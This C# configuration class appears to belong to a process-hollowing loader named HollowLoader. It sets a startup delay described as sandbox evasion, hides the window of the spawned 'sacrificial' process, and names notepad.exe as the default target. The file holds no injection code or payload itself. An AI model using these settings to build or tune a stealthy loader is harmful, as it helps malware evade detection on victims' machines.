namespace HollowLoader
{
    /// <summary>Compile-time operational configuration.</summary>
    internal static class Config
    {
        /// <summary>Silent-ish startup delay in ms (sandbox evasion). 0 disables.</summary>
        internal const int StartupDelayMs = 3000;

        /// <summary>Add CREATE_NO_WINDOW when spawning the sacrificial process.</summary>
        internal const bool HideWindow = true;

        /// <summary>Default sacrificial process (relative to System32).</summary>
        internal const string DefaultTarget = "notepad.exe";
    }
}
